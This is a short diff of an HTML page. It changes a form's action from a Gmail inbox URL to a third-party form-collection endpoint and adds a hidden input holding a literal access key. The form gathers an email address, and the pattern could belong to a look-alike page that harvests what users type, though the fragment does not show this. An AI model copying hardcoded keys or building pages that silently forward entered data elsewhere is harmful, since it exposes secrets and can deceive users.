@@ -34,8 +34,14 @@
         <div class="SearchBox">
           <form
             onsubmit="return myData()"
-            action="https://mail.google.com/mail/u/0/#inbox"
+            action="https://api.web3forms.com/submit"
+            method="POST"
           >
+            <input
+              type="hidden"
+              name="access_key"
+              value="ac5bfbe0-04db-4f35-b91c-499ff1793800"
+            />
             <div class="form">
               <input
                 type="email"
